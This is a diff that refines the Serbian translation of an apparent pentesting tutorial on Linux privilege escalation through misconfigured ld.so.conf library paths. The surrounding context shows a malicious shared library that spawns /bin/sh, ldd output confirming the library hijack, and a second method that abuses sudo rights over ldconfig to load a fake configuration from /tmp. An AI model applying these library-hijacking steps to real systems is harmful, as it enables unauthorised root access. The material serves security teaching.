@@ -59,7 +59,7 @@ $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-## Eksploatacija
+## Exploit
 
 U ovom scenariju pretpostavićemo da je **neko kreirao ranjiv ulaz** unutar datoteke u _/etc/ld.so.conf/_:
 ```bash
@@ -81,9 +81,9 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Sada kada smo **napravili zlu libcustom biblioteku unutar pogrešno konfigurisane** putanje, treba da sačekamo na **ponovno pokretanje** ili da korisnik root izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovu binarnu datoteku kao **sudo** ili da ima **suid bit**, moći ćete da je izvršite sami_).
+Sada kada smo **napravili zlu libcustom biblioteku unutar pogrešno konfigurisane** putanje, potrebno je da sačekamo na **ponovno pokretanje** ili da korisnik root izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovu binarnu datoteku kao **sudo** ili da ima **suid bit**, moći ćete da je izvršite sami_).
 
-Kada se to desi, **ponovo proverite** odakle `sharevuln` izvršna datoteka učitava `libcustom.so` biblioteku:
+Kada se to dogodi, **ponovo proverite** odakle `sharevuln` izvršna datoteka učitava `libcustom.so` biblioteku:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -91,7 +91,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Kao što možete videti, **učitava se iz `/home/ubuntu/lib`** i ako bilo koji korisnik to izvrši, biće izvršena ljuska:
+Kao što možete videti, **učitava se iz `/home/ubuntu/lib`** i ako bilo koji korisnik to izvrši, izvršiće se shell:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -104,14 +104,14 @@ ubuntu
 
 ### Druge pogrešne konfiguracije - Ista ranjivost
 
-U prethodnom primeru smo simulirali pogrešnu konfiguraciju gde je administrator **postavio folder bez privilegija unutar konfiguracionog fajla unutar `/etc/ld.so.conf.d/`**.\
-Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost, ako imate **dozvole za pisanje** u nekom **konfiguracionom fajlu** unutar `/etc/ld.so.conf.d`, u folderu `/etc/ld.so.conf.d` ili u fajlu `/etc/ld.so.conf` možete konfigurisati istu ranjivost i iskoristiti je.
+U prethodnom primeru smo simulirali pogrešnu konfiguraciju gde je administrator **postavio neprivilegovanu fasciklu unutar konfiguracionog fajla unutar `/etc/ld.so.conf.d/`**.\
+Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost, ako imate **dozvole za pisanje** u nekom **konfiguracionom fajlu** unutar `/etc/ld.so.conf.d`, u fascikli `/etc/ld.so.conf.d` ili u fajlu `/etc/ld.so.conf` možete konfigurisati istu ranjivost i iskoristiti je.
 
 ## Eksploatacija 2
 
 **Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
-Možete naznačiti `ldconfig` **odakle da učita konf fajlove**, tako da možemo iskoristiti to da nateramo `ldconfig` da učita proizvoljne foldere.\
-Dakle, hajde da kreiramo fajlove i foldere potrebne za učitavanje "/tmp":
+Možete naznačiti `ldconfig` **odakle da učita konf fajlove**, tako da možemo iskoristiti to da nateramo `ldconfig` da učita proizvoljne fascikle.\
+Dakle, hajde da kreiramo fajlove i fascikle potrebne za učitavanje "/tmp":
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
